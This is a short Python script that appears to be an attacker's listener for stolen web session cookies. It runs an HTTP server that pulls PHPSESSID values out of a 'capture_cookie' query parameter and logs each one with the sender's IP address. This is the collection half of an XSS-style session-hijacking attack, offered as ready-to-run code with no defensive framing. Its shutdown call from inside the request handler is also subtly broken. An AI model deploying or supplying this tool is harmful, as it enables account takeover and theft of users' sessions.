from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

# Function to run the web server and capture PHPSESSID
def capture_phpsessid(port=8888, max_connections=3):
    captured_data = []

    class CaptureCookieHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            # Parse the query parameters
            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)
            
            # Check if capture_cookie is present and contains PHPSESSID
            if 'capture_cookie' in params:
                cookie_data = params.get('capture_cookie', [''])[0]
                if 'PHPSESSID:' in cookie_data:
                    phpsessid = cookie_data.split(':')[1]  # Extract PHPSESSID
                    client_ip = self.client_address[0]
                    captured_data.append({'ip': client_ip, 'phpsessid': phpsessid})
            
            # Respond to the client
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"PHPSESSID captured. You can close this window.")
            
            # Stop the server if we reached the max number of connections
            if len(captured_data) >= max_connections:
                print("Captured 3 connections. Stopping server.")
                server.shutdown()

    # Start the web server
    server = HTTPServer(('0.0.0.0', port), CaptureCookieHandler)
    
    try:
        print(f"Server running on port {port}...")
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()
    
    # Return the captured PHPSESSID and IPs after stopping
    return captured_data

# Example usage
if __name__ == "__main__":
    phpsessid_data = capture_phpsessid(port=8888, max_connections=3)
    print("Captured PHPSESSID and IPs:", phpsessid_data)
